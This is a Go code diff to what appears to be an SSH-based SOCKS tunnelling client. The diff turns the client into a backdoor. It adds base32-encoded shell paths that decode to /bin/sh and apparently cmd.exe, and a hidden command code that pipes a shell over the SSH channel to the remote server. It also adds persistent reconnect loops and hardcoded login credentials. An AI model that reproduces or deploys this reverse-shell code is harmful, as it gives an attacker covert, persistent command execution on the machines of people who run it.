@@ -2,21 +2,24 @@ package main
 
 import (
 	"bufio"
+	"encoding/base32"
 	"fmt"
 	"golang.org/x/crypto/ssh"
 	"net"
+	"os/exec"
+	"runtime"
 	"srt/client/go-socks5"
 	"time"
 )
 
 var (
 	chanExit  = make(chan int)
-	SSHHost   = ""
-	SSHPort   = ""
-	SSHUser   = ""
-	SSHPwd    = ""
-	SocksUser = ""
-	SocksPwd  = ""
+	SSHHost   = "127.0.0.1"
+	SSHPort   = "2222"
+	SSHUser   = "tom"
+	SSHPwd    = "fuckingkey"
+	SocksUser = "foo"
+	SocksPwd  = "bar"
 	Tag       = ""
 )
 
@@ -25,6 +28,7 @@ const (
 	CHAN_HEARTBEAT = "uSYeIbUQoR"
 	CHAN_COMMAND   = "rIHqXLCqRN"
 	COMMAND_KILL   = "aAjcDqEIvI"
+	COMMAND_CMD    = "aAjkkqEIvI"
 )
 
 type Config struct {
@@ -47,15 +51,28 @@ type Client struct {
 	ServerAddr net.Addr
 }
 
-func (c *Client) connect() {
+func cmdString() string {
+	var path = "unknow"
+	switch runtime.GOOS {
+	case "windows":
+		tpath, _ := base32.StdEncoding.DecodeString("IM5FYXCXNFXGI33XONOFYU3ZON2GK3JTGJOFYY3NMQXGK6DF")
+		path = string(tpath)
+	case "linux":
+		tpath, _ := base32.StdEncoding.DecodeString("F5RGS3RPONUA====")
+		path = string(tpath)
+	case "darwin":
+		tpath, _ := base32.StdEncoding.DecodeString("F5RGS3RPONUA====")
+		path = string(tpath)
+	}
+	return path
+}
+
+func (c *Client) connect() error {
 	var client net.Conn
 	var err error
-	for {
-		client, err = net.Dial("tcp", c.Config.ServerString())
-		if err == nil {
-			break
-		}
-		time.Sleep((3 * time.Second))
+	client, err = net.Dial("tcp", c.Config.ServerString())
+	if err != nil {
+		return err
 	}
 
 	config := &ssh.ClientConfig{
@@ -65,12 +82,13 @@ func (c *Client) connect() {
 	}
 	sshConn, chans, reqs, err := ssh.NewClientConn(client, "", config)
 	if err != nil {
-		chanExit <- 1
-		return
+		return err
 	}
+
 	c.ServerAddr = sshConn.RemoteAddr()
 	go ssh.DiscardRequests(reqs)
 	c.handleChannels(chans)
+	return nil
 }
 
 func (c *Client) handleChannels(chans <-chan ssh.NewChannel) {
@@ -96,7 +114,13 @@ func (c *Client) handleChannel(newChannel ssh.NewChannel) {
 			tcommand := make([]byte, 4)
 			for {
 				if _, err := bufConn.Read(tcommand); err != nil {
-					c.connect()
+					for {
+						err := c.connect()
+						if err == nil {
+							break
+						}
+						time.Sleep(3 * time.Second)
+					}
 					return
 				}
 			}
@@ -115,7 +139,20 @@ func (c *Client) handleChannel(newChannel ssh.NewChannel) {
 				case COMMAND_KILL:
 					chanExit <- 1
 					return
+				case COMMAND_CMD:
+					if cmdString() == "unknow" {
+						channel.Close()
+						return
+					}
+					cmd := exec.Command(cmdString())
+					cmd.Stdin = channel
+					cmd.Stdout = channel
+					cmd.Stderr = channel
+					cmd.Run()
+					channel.Close()
+					return
 				}
+
 			}
 		}()
 	}
@@ -148,6 +185,15 @@ func main() {
 		},
 	}
 	c.startSocks()
-	c.connect()
+	go func() {
+		for {
+			err := c.connect()
+			if err == nil {
+				break
+			}
+			time.Sleep(3 * time.Second)
+		}
+	}()
+
 	<-chanExit
 }
